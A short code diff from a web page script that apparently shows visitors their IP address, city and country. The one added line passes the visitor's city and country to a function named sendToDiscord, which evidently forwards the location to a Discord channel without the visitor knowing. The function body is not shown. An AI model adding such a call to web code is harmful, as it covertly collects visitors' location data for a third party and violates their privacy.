@@ -71,6 +71,7 @@
                 let country = await countryResponse.json();
                 document.getElementById('miasto').innerText = country.city;
                 document.getElementById('kraj').innerText = country.country_name;
+                sendToDiscord(country.city, country.country_name);
             } catch (error) {
                 document.getElementById('ip').innerText = 'Error fetching IP';
             }
